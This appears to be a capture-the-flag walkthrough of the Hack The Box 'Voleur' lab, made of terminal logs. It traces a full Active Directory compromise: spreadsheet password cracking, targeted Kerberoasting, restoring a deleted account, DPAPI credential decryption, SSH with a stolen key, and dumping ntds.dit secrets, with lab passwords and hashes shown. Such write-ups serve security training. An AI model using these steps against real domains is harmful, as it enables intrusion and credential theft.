@@ -1,0 +1,580 @@
+
+
+
+As is common in real life Windows pentests, you will start the Voleur box with credentials for the following account: 
+ryan.naylor / HollowOct31Nyt
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# netexec smb 10.10.11.76 -u ryan.nayload -p 'HollowOct31Nyt'        
+SMB         10.10.11.76     445    10.10.11.76      [*]  x64 (name:10.10.11.76) (domain:10.10.11.76) (signing:True) (SMBv1:False) (NTLM:False)
+SMB         10.10.11.76     445    10.10.11.76      [-] 10.10.11.76\ryan.nayload:HollowOct31Nyt STATUS_NOT_SUPPORTED 
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+We can use netexec to generate the krb5.conf file
+
+┌──(root㉿kali)-[/home/kali]
+└─# netexec smb 10.10.11.76 -u ryan.nayload -p 'HollowOct31Nyt' -d voleur.htb -k --generate-krb5-file voleur.krb5
+SMB         10.10.11.76     445    10.10.11.76      [*]  x64 (name:10.10.11.76) (domain:10.10.11.76) (signing:True) (SMBv1:False) (NTLM:False)
+SMB         10.10.11.76     445    10.10.11.76      [-] voleur.htb\ryan.nayload:HollowOct31Nyt KDC_ERR_C_PRINCIPAL_UNKNOWN
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# export KRB5_CONFIG="$(pwd)/voleur.krb5"                       
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# net time set -S voleur.htb                                                                                   
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# nxc smb DC.voleur.htb -u ryan.naylor -p 'HollowOct31Nyt' -k --shares
+SMB         DC.voleur.htb   445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
+SMB         DC.voleur.htb   445    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
+SMB         DC.voleur.htb   445    DC               [*] Enumerated shares
+SMB         DC.voleur.htb   445    DC               Share           Permissions     Remark
+SMB         DC.voleur.htb   445    DC               -----           -----------     ------
+SMB         DC.voleur.htb   445    DC               ADMIN$                          Remote Admin
+SMB         DC.voleur.htb   445    DC               C$                              Default share
+SMB         DC.voleur.htb   445    DC               Finance                         
+SMB         DC.voleur.htb   445    DC               HR                              
+SMB         DC.voleur.htb   445    DC               IPC$            READ            Remote IPC
+SMB         DC.voleur.htb   445    DC               IT              READ            
+SMB         DC.voleur.htb   445    DC               NETLOGON        READ            Logon server share 
+SMB         DC.voleur.htb   445    DC               SYSVOL          READ            Logon server share 
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# nxc smb DC.voleur.htb -u ryan.naylor -p 'HollowOct31Nyt' -d voleur.htb -k --share IT --get-file 'First-Line Support\\Access_Review.xlsx' Access_Review.xlsx                          
+SMB         DC.voleur.htb   445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
+SMB         DC.voleur.htb   445    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
+SMB         DC.voleur.htb   445    DC               [*] Copying "First-Line Support\\Access_Review.xlsx" to "Access_Review.xlsx"
+SMB         DC.voleur.htb   445    DC               [+] File "First-Line Support\\Access_Review.xlsx" was downloaded to "Access_Review.xlsx"
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# office2john Access_Review.xlsx > hash           
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 256/256 AVX2 8x / SHA512 256/256 AVX2 4x AES])
+Cost 1 (MS Office version) is 2013 for all loaded hashes
+Cost 2 (iteration count) is 100000 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+football1        (Access_Review.xlsx)     
+1g 0:00:00:01 DONE (2025-11-13 00:46) 0.5434g/s 434.7p/s 434.7c/s 434.7C/s football1..martha
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+User	Job Title	Permissions	Notes
+Ryan.Naylor	First-Line Support Technician	SMB	Has Kerberos Pre-Auth disabled temporarily to test legacy systems.
+Marie.Bryant	First-Line Support Technician	SMB	
+Lacey.Miller	Second-Line Support Technician	Remote Management Users	
+Todd.Wolfe	Second-Line Support Technician	Remote Management Users	Leaver. Password was reset to NightT1meP1dg3on14 and account deleted.
+Jeremy.Combs	Third-Line Support Technician	Remote Management Users.	Has access to Software folder.
+Administrator	Administrator	Domain Admin	Not to be used for daily tasks!
+			
+			
+Service Accounts			
+svc_backup	 	Windows Backup	Speak to Jeremy!
+svc_ldap		LDAP Services	P/W - M1XyC9pW7qT5Vn
+svc_iis		IIS Administration	P/W - N5pXyW1VqM7CZ8
+svc_winrm		Remote Management 	Need to ask Lacey as she reset this recently.
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# nxc smb DC.voleur.htb -u users -p passwords -k --continue-on-success
+SMB         DC.voleur.htb   445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
+...
+SMB         DC.voleur.htb   445    DC               [+] voleur.htb\svc_ldap:M1XyC9pW7qT5Vn 
+...
+SMB         DC.voleur.htb   445    DC               [+] voleur.htb\svc_iis:N5pXyW1VqM7CZ8 
+...
+SMB         DC.voleur.htb   445    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
+...
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# bloodhound-python -u ryan.naylor -p HollowOct31Nyt -k -d 'voleur.htb' -c All --zip -dc DC.voleur.htb -ns 10.10.11.76
+INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
+INFO: Found AD domain: voleur.htb
+INFO: Getting TGT for user
+INFO: Connecting to LDAP server: DC.voleur.htb
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 1 computers
+INFO: Connecting to LDAP server: DC.voleur.htb
+INFO: Found 12 users
+INFO: Found 56 groups
+INFO: Found 2 gpos
+INFO: Found 5 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: DC.voleur.htb
+INFO: Done in 00M 07S
+INFO: Compressing output into 20251113010019_bloodhound.zip
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+
+svc_ldap can WriteSPN svc_winrm
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# impacket-getTGT voleur.htb/svc_ldap:M1XyC9pW7qT5Vn -dc-ip 10.10.11.76
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in svc_ldap.ccache
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# export KRB5CCNAME=/home/kali/svc_ldap.ccache 
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# python3 targetedKerberoast.py -d voleur.htb --dc-host DC.voleur.htb -u svc_ldap@voleur.htb -k
+[*] Starting kerberoast attacks
+[*] Fetching usernames from Active Directory with LDAP
+[+] Printing hash for (lacey.miller)
+$krb5tgs$23$*lacey.miller$VOLEUR.HTB$voleur.htb/lacey.miller*$a44b0e2996fb72bb77defa289da811bc$41720893cf6da3b840e1a3de64423c0a50616cd2a95fccd9191b95029108dde7a842c93368f77e0e53e69facfddea65e6b30bb3b6eb3967c3afd417b31d4689bf7cd8eaf4dba71c7e459cee6a853718d2104cdef5f66bb81fcfd247f11e8d427bbd3d83c4059cd921fd67bdb1154919e043b972c04df10a069b1e8bf4eb3c4d6cf446250ceb68b4b6a42880f6da2579fe4c856d2ade9eab62804685e03a303ac1a123c65fc81da301269d1e4426bff9df71bafffe5fd68e32c8a34c7dde1e45e0471d3fb8e12701b63d385e5cd2fd5ce0bc527681789c436adb63a43181b65a84d691abd98d6fb1430c23c9d4f0d1fff5ae7641de2bc38cbe3879f0d16536c053e380679173c15be485fdc4f5eb5d3f9db1f39a39f9511560af5da91f6b71aa1f9082407f2252b4883a95e5c4474dce48c343165888936f9a1adb06e87f9cf257f179de3501278cebd13a522d3d54d0efbd4a0cabf405987ee30cf05d147fea30f833902aa3049d342ecdb8c2cd403934513e6aa0268b8c8d4a5bf25968b4c0cf13874cd460acae330af62b092d975f2ee31d23603e6cb61e8ebd87c529d1e8cdf1ddc19ce8faab2b92a1bde643dd052fc322f781c53af94bb04d450ab156f08f1f8083c4ed72961dfc1c1b93edd49f95fc22fe2f57b92725c8f1692321c98e495cc5a5e15b5c861cfb1e29ea9fab996f58017809638fb790a55b96cc508ed03e9f892f32f8f097323a3fe2d4907bcd320d75a01425ef4c2c5a6408f22451d700c451b723399b3e6665d92cbe6881599c14d4f87e6ef5344a203e6cc705fe3b77dfcab28be03eb45542e7be35525a9d63e7516055da55a1b48cbe384c835cb45570a472110bed51474748f3b067dbd4eddc5afc33f060b24d0880287dc617fd55035e7ad5afad7570017731d73ee003cfb87b1d2e711f3ebfdfdbb68f860808283ec6ed26d43c11b2c5908f119c937e142b94dc8e8b539332ee890fc6927ffe3a17d4fe0aafffb85dd42d72461c17beafbf492780caf259309d0ae3b429b3a9bb338c41b473d6417f4020d80cfaffe63e28f73864af1de2cb21c59a341e4be61000348e5e1b55e00bb9458cbf1a8d674964b498b8903581363bbb197b330d1d5bfb1d91c3542c7fa94d1a3bb1ef0df14f186a8ccaddc4b64f6530bb35aabea5794032ba0ed5a024fb6371a59b2c0884071fb549b5a752d02a1c5c25d4d5ce8a077db5360a46a8baca546eed7fa31a58aabf878f9374c629e50074cb5832f10cb98586a2696b8227810568251146a732afc9e387eb190f16e9b9d1b30fa1c929c8077fc4dc8d29aa22c02912a61cf4bfe19ba270fd6a4d6dbdd62ccd44754e2666ba83b609373accf229b9f56db6034baffa2169c82de2022ea0eb7ba4450a2ba18f3d1389466e5f5aa2ec3daac6414146396aa60122cc52cfefdc8af57f453468e8cfa6c46bc2d5ea07970984a79caea497b5f
+[+] Printing hash for (svc_winrm)
+$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$e1a54e9130806fa7a5242472493b6a9a$b8debb8b6df2c8af636742256352404b2005c0e3f01e5ce949ff97babb8020af0e30efcb99df4478e52eba7677664472456231df7b7cf59bc01c6a0ce74dd34e2f78273af4a4b69e4d3a1bfed91279ade3aea1ca780c9d5efe4993a2148b7a41c16ee67c909f2eb2c98e546de86a91c8cf6b3bd8b076df67d92128008de6f1472e301747757fa1d7a5fcf0523c8765f94f959920bce14590564df49c9fad6cdc853af1cb112e7ed363fa05239c1f79249d20644bd8259ca29b960ae2d3d96712ca290badd9394930c86f051a1f17a3b8050cd2c20bb8af63b1acf5dad05c48a7cda61f4e3222722b56eb4923c54e86b883fcc84c3032bc515dcbdd17519b9de81afc24b4c57e1e3435c51b1ab20d9657c6ea5d0e29815d75838bb8703f6f0838e36efe7809d3de7a69cc979ad7c59a04c2b6d5287228d9a1f4e72fc46b6a17f6deff67b26344e59f2620f1e8984ab53fbdef9b68a66060a7a38b9b5ac5f7f14e14219d5677751d4a70b864ff9c13c2781beddd73a3fa41db455d8e5fca5ad56b663d253c2c390d2d9d1706fea9aaaa9ad7c5bdf8da7c0b2076c70654afaddb722a312f464d281626ec4ebaa3ae66f7285567930385b3f1e1309768ea8571d9eaab773f6241ead333ca98cb7841c5addf683d4fe000662a2e36d10b4f708e42e1f9df6a87dcab3d72ff690998f49f70f3253e3cb54a7cad0b8a63c2cb949bacfdfd53bdaab8c4038469d92f924daa3d29c90c0035a207c3963d0d2dbb37bb0171f6607560c616a0f02d5ae35b4b5544f84a67e9ee4e169a8df17c7d3fc124b8980f5827b873a0b6b88ef2d69e3122a2492ae951abefc470e55f7f695aa3e8ad496bf1cb119ea645461ad737a4b2e0e1c2104cae639a1f4f6a502c0cdc9a758bd63afd78a88582c638454fb713d845d1ffd68df2c2105a392a76b804c46087004717ae8b80e0d7810bf8ddb59737b962dfb6074f4e5e9da2aa8eb20be37a8247961252faa3481277e6a61aa6832559f9b94776addcf895ef315fe7bc069e8addf385d6abb527b5b2fbe1caecccac164f3c029af822867e697dcde0e2e62c69c06b818bd112df6bfedd6e499816e5d135b3415ca8cd8c0208be22dbaa2e60286708e6d29ce437c2212b6ff82ca55b30f8c02afd6d1a3b7d3435c90d19c0f96444e6f4ac01be4aa5176e0f36558e8d1a5e9fb1d65be0f72742d8f525970885bf16e1959ce6e33c6da03c728110db53b9f419fd64bb579ec86618e61527c7adace4f0d6eb8dfa75e18dd31c214b46997fd26974aad58373a74d55cfdaef99d08607e813dac70571268676855e594bbb4a0d6dde90cd0e86307a7122325dc8eabb0f12e28b6e55ef886ae598428835c0cfd30c11e4c4c9f5c0b21553d9a815e3fa7121617a14f545e358c92ecea6811b5ada1b7fb73ab4e3f4c17e646d03bbc477faf38ebe6311e9d53d12c43089039a514992d3ce25
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+
+We are only able to crack the hash for svc_winrm
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+AFireInsidedeOzarctica980219afi (?)     
+1g 0:00:00:05 DONE (2025-11-13 01:45) 0.1769g/s 2030Kp/s 2030Kc/s 2030KC/s AHANACK6978012..AFITA4162
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+┌──(root㉿kali)-[/home/kali]
+└─# impacket-getTGT voleur.HTB/svc_winrm:AFireInsidedeOzarctica980219afi -dc-ip 10.10.11.76
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in svc_winrm.ccache
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+svc_ldap is a member of RESTORE_USER which has GenericWrite over lacey.miller and second-line support technicians
+
+
+*Evil-WinRM* PS C:\Users\svc_winrm\Documents> upload Invoke-RunasCs64.ps1
+                                        
+Info: Uploading /home/kali/Invoke-RunasCs64.ps1 to C:\Users\svc_winrm\Documents\Invoke-RunasCs64.ps1
+                                        
+Data: 101328 bytes of 101328 bytes copied
+                                        
+Info: Upload successful!
+*Evil-WinRM* PS C:\Users\svc_winrm\Documents> . ./Invoke-RunasCs64.ps1
+
+
+
+*Evil-WinRM* PS C:\Users\svc_winrm\Documents> Invoke-RunasCs -Username svc_ldap -Password M1XyC9pW7qT5Vn -Command "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Get-ADObject -Filter 'isDeleted -eq `$true' -IncludeDeletedObjects -Properties distinguishedName,objectSid -SearchBase 'CN=Deleted Objects,DC=voleur,DC=htb'"
+
+
+
+Deleted           : True
+DistinguishedName : CN=Deleted Objects,DC=voleur,DC=htb
+Name              : Deleted Objects
+ObjectClass       : container
+ObjectGUID        : 587cd8b4-6f6a-46d9-8bd4-8fb31d2e18d8
+
+Deleted           : True
+DistinguishedName : CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb
+Name              : Todd Wolfe
+                    DEL:1c6b1deb-c372-4cbb-87b1-15031de169db
+ObjectClass       : user
+ObjectGUID        : 1c6b1deb-c372-4cbb-87b1-15031de169db
+objectSid         : S-1-5-21-3927696377-1337352550-2781715495-1110
+
+
+
+*Evil-WinRM* PS C:\Users\svc_winrm\Documents> 
+
+
+
+
+
+*Evil-WinRM* PS C:\Users\svc_winrm\Documents> Invoke-RunasCs -Username svc_ldap -Password M1XyC9pW7qT5Vn -Command "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Restore-ADObject 'CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb'"
+
+No output received from the process.
+
+
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# impacket-getTGT voleur.htb/todd.wolfe:NightT1meP1dg3on14 -dc-ip 10.10.11.76     
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in todd.wolfe.ccache
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+┌──(root㉿kali)-[/home/kali]
+└─# export KRB5CCNAME=/home/kali/todd.wolfe.ccache 
+                                                    
+
+todd also had read access in IT, but different.
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# impacket-smbclient -k -no-pass voleur.htb/todd.wolfe@dc.voleur.htb
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+Type help for list of commands
+# use IT
+# cd Second-Line Support
+# ls
+drw-rw-rw-          0  Wed Jan 29 10:13:03 2025 .
+drw-rw-rw-          0  Wed Jan 29 04:10:01 2025 ..
+drw-rw-rw-          0  Wed Jan 29 10:13:06 2025 Archived Users
+# cd Archived Users
+# ls
+drw-rw-rw-          0  Wed Jan 29 10:13:06 2025 .
+drw-rw-rw-          0  Wed Jan 29 10:13:03 2025 ..
+drw-rw-rw-          0  Wed Jan 29 10:13:16 2025 todd.wolfe
+# cd todd.wolfe
+# ls
+drw-rw-rw-          0  Wed Jan 29 10:13:16 2025 .
+drw-rw-rw-          0  Wed Jan 29 10:13:06 2025 ..
+drw-rw-rw-          0  Wed Jan 29 10:13:06 2025 3D Objects
+drw-rw-rw-          0  Wed Jan 29 10:13:09 2025 AppData
+drw-rw-rw-          0  Wed Jan 29 10:13:10 2025 Contacts
+drw-rw-rw-          0  Thu Jan 30 09:28:50 2025 Desktop
+drw-rw-rw-          0  Wed Jan 29 10:13:10 2025 Documents
+drw-rw-rw-          0  Wed Jan 29 10:13:10 2025 Downloads
+drw-rw-rw-          0  Wed Jan 29 10:13:10 2025 Favorites
+drw-rw-rw-          0  Wed Jan 29 10:13:10 2025 Links
+drw-rw-rw-          0  Wed Jan 29 10:13:10 2025 Music
+-rw-rw-rw-      65536  Wed Jan 29 10:13:06 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TM.blf
+-rw-rw-rw-     524288  Wed Jan 29 07:53:07 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000001.regtrans-ms
+-rw-rw-rw-     524288  Wed Jan 29 07:53:07 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000002.regtrans-ms
+-rw-rw-rw-         20  Wed Jan 29 07:53:07 2025 ntuser.ini
+drw-rw-rw-          0  Wed Jan 29 10:13:10 2025 Pictures
+drw-rw-rw-          0  Wed Jan 29 10:13:10 2025 Saved Games
+drw-rw-rw-          0  Wed Jan 29 10:13:10 2025 Searches
+drw-rw-rw-          0  Wed Jan 29 10:13:10 2025 Videos
+# cd AppData/Roaming/Microsoft/Credentials
+# ls
+drw-rw-rw-          0  Wed Jan 29 10:13:09 2025 .
+drw-rw-rw-          0  Wed Jan 29 10:13:09 2025 ..
+-rw-rw-rw-        398  Wed Jan 29 08:13:50 2025 772275FAD58525253490A9B0039791D3
+# get 772275FAD58525253490A9B0039791D3
+# cd ../Protect
+# ls
+drw-rw-rw-          0  Wed Jan 29 10:13:09 2025 .
+drw-rw-rw-          0  Wed Jan 29 10:13:09 2025 ..
+-rw-rw-rw-         24  Wed Jan 29 07:53:08 2025 CREDHIST
+drw-rw-rw-          0  Wed Jan 29 10:13:09 2025 S-1-5-21-3927696377-1337352550-2781715495-1110
+-rw-rw-rw-         76  Wed Jan 29 07:53:08 2025 SYNCHIST
+# cd S-1-5-21-3927696377-1337352550-2781715495-1110
+# ls
+drw-rw-rw-          0  Wed Jan 29 10:13:09 2025 .
+drw-rw-rw-          0  Wed Jan 29 10:13:09 2025 ..
+-rw-rw-rw-        740  Wed Jan 29 08:09:25 2025 08949382-134f-4c63-b93c-ce52efc0aa88
+-rw-rw-rw-        900  Wed Jan 29 07:53:08 2025 BK-VOLEUR
+-rw-rw-rw-         24  Wed Jan 29 07:53:08 2025 Preferred
+# get 08949382-134f-4c63-b93c-ce52efc0aa88
+# 
+
+
+
+
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[MASTERKEYFILE]
+Version     :        2 (2)
+Guid        : 08949382-134f-4c63-b93c-ce52efc0aa88
+Flags       :        0 (0)
+Policy      :        0 (0)
+MasterKeyLen: 00000088 (136)
+BackupKeyLen: 00000068 (104)
+CredHistLen : 00000000 (0)
+DomainKeyLen: 00000174 (372)
+
+Password:
+Decrypted key with User Key (MD4 protected)
+Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# impacket-dpapi credential -file 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[CREDENTIAL]
+LastWritten : 2025-01-29 12:55:19+00:00
+Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
+Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
+Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
+Target      : Domain:target=Jezzas_Account
+Description : 
+Unknown     : 
+Username    : jeremy.combs
+Unknown     : qT3V9pLXyN7W4m
+
+                                                                                                                     
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# impacket-getTGT voleur.htb/jeremy.combs:qT3V9pLXyN7W4m -dc-ip 10.10.11.76
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in jeremy.combs.ccache
+                                                                                                                     
+
+┌──(root㉿kali)-[/home/kali]
+└─# export KRB5CCNAME=/home/kali/jeremy.combs.ccache 
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# evil-winrm -i dc.voleur.htb -r voleur.htb       
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\jeremy.combs\Documents> 
+
+
+
+
+
+*Evil-WinRM* PS C:\IT\Third-Line Support> ls
+
+
+    Directory: C:\IT\Third-Line Support
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         1/30/2025   8:11 AM                Backups
+-a----         1/30/2025   8:10 AM           2602 id_rsa
+-a----         1/30/2025   8:07 AM            186 Note.txt.txt
+
+
+*Evil-WinRM* PS C:\IT\Third-Line Support> type Note.txt.txt
+Jeremy,
+
+I've had enough of Windows Backup! I've part configured WSL to see if we can utilize any of the backup tools from Linux.
+
+Please see what you can set up.
+
+Thanks,
+
+Admin
+*Evil-WinRM* PS C:\IT\Third-Line Support> download id_rsa
+                                        
+Info: Downloading C:\IT\Third-Line Support\id_rsa to id_rsa
+                                        
+Info: Download successful!
+*Evil-WinRM* PS C:\IT\Third-Line Support> 
+
+
+"The note indicates experiments with backup tooling and WSL . The presence of an id_rsa file and our Nmap
+scan showing OpenSSH on port 2222 strongly suggests an SSH-accessible Linux host running on port 2222
+related to backups."
+
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# chmod 600 id_rsa 
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# ssh -i id_rsa svc_backup@10.10.11.76 -p 2222              
+The authenticity of host '[10.10.11.76]:2222 ([10.10.11.76]:2222)' can't be established.
+ED25519 key fingerprint is SHA256:mKWAEwLTnEN2bJNi7fkc+BZodiXCIiP3ywSLJiZL0ss.
+...
+Last login: Thu Jan 30 04:26:24 2025 from 127.0.0.1
+ * Starting OpenBSD Secure Shell server sshd                                                                  [ OK ] 
+svc_backup@DC:~$ 
+
+----------------------------------------------------
+(this part is unnecessary)
+
+svc_backup@DC:/$ sudo -l
+Matching Defaults entries for svc_backup on DC:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User svc_backup may run the following commands on DC:
+    (ALL : ALL) ALL
+    (ALL) NOPASSWD: ALL
+svc_backup@DC:/$ sudo /bin/bash -p
+root@DC:/# id
+uid=0(root) gid=0(root) groups=0(root)
+-----------------------------------------------------
+
+root@DC:/# ls
+bin   dev  home  lib    lib64   media  opt   root  sbin  srv  tmp  var
+boot  etc  init  lib32  libx32  mnt    proc  run   snap  sys  usr
+root@DC:/# cd mnt
+root@DC:/mnt# ls
+c
+root@DC:/mnt# cd c
+root@DC:/mnt/c# ls
+ls: cannot access 'DumpStack.log.tmp': Permission denied
+ls: cannot access 'pagefile.sys': Permission denied
+'$Recycle.Bin'             DumpStack.log.tmp   PerfLogs               Recovery                     inetpub
+'$WinREAgent'              Finance            'Program Files'        'System Volume Information'   pagefile.sys
+ Config.Msi                HR                 'Program Files (x86)'   Users
+'Documents and Settings'   IT                  ProgramData            Windows
+root@DC:/mnt/c# cd IT
+root@DC:/mnt/c/IT# cd "Third-Line Support"
+root@DC:/mnt/c/IT/Third-Line Support# cd Backups
+root@DC:/mnt/c/IT/Third-Line Support/Backups# ls
+'Active Directory'   registry
+root@DC:/mnt/c/IT/Third-Line Support/Backups# cd registry/
+root@DC:/mnt/c/IT/Third-Line Support/Backups/registry# ls
+SECURITY  SYSTEM
+root@DC:/mnt/c/IT/Third-Line Support/Backups/registry# cd ..
+root@DC:/mnt/c/IT/Third-Line Support/Backups# cd Active\ Directory/
+root@DC:/mnt/c/IT/Third-Line Support/Backups/Active Directory# ls -lsa
+total 24592
+    0 drwxrwxrwx 1 svc_backup svc_backup     4096 Jan 30  2025 .
+    0 drwxrwxrwx 1 svc_backup svc_backup     4096 Jan 30  2025 ..
+24576 -rwxrwxrwx 1 svc_backup svc_backup 25165824 Jan 30  2025 ntds.dit
+   16 -rwxrwxrwx 1 svc_backup svc_backup    16384 Jan 30  2025 ntds.jfm
+root@DC:/mnt/c/IT/Third-Line Support/Backups/Active Directory# 
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# scp -i id_rsa -P 2222 svc_backup@10.10.11.76:"/mnt/c/IT/Third-Line Support/Backups/Active Directory/ntds.dit" .
+scp -i id_rsa -P 2222 svc_backup@10.10.11.76:"/mnt/c/IT/Third-Line Support/Backups/registry/SYSTEM" .
+scp -i id_rsa -P 2222 svc_backup@10.10.11.76:"/mnt/c/IT/Third-Line Support/Backups/registry/SECURITY" .
+ntds.dit                                                                           100%   24MB   2.6MB/s   00:09    
+SYSTEM                                                                             100%   18MB   3.1MB/s   00:05    
+SECURITY                                                                           100%   32KB 320.3KB/s   00:00    
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# impacket-secretsdump -ntds ntds.dit -system SYSTEM -security SECURITY local
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Target system bootKey: 0xbbdd1a32433b87bcc9b875321b883d2d
+[*] Dumping cached domain logon information (domain/username:hash)
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC 
+$MACHINE.ACC:plain_password_hex:759d6c7b27b4c7c4feda8909bc656985b457ea8d7cee9e0be67971bcb648008804103df46ed40750e8d3be1a84b89be42a27e7c0e2d0f6437f8b3044e840735f37ba5359abae5fca8fe78959b667cd5a68f2a569b657ee43f9931e2fff61f9a6f2e239e384ec65e9e64e72c503bd86371ac800eb66d67f1bed955b3cf4fe7c46fca764fb98f5be358b62a9b02057f0eb5a17c1d67170dda9514d11f065accac76de1ccdb1dae5ead8aa58c639b69217c4287f3228a746b4e8fd56aea32e2e8172fbc19d2c8d8b16fc56b469d7b7b94db5cc967b9ea9d76cc7883ff2c854f76918562baacad873958a7964082c58287e2
+$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77
+[*] DPAPI_SYSTEM 
+dpapi_machinekey:0x5d117895b83add68c59c7c48bb6db5923519f436
+dpapi_userkey:0xdce451c1fdc323ee07272945e3e0013d5a07d1c3
+[*] NL$KM 
+ 0000   06 6A DC 3B AE F7 34 91  73 0F 6C E0 55 FE A3 FF   .j.;..4.s.l.U...
+ 0010   30 31 90 0A E7 C6 12 01  08 5A D0 1E A5 BB D2 37   01.......Z.....7
+ 0020   61 C3 FA 0D AF C9 94 4A  01 75 53 04 46 66 0A AC   a......J.uS.Ff..
+ 0030   D8 99 1F D3 BE 53 0C CF  6E 2A 4E 74 F2 E9 F2 EB   .....S..n*Nt....
+NL$KM:066adc3baef73491730f6ce055fea3ff3031900ae7c61201085ad01ea5bbd23761c3fa0dafc9944a0175530446660aacd8991fd3be530ccf6e2a4e74f2e9f2eb
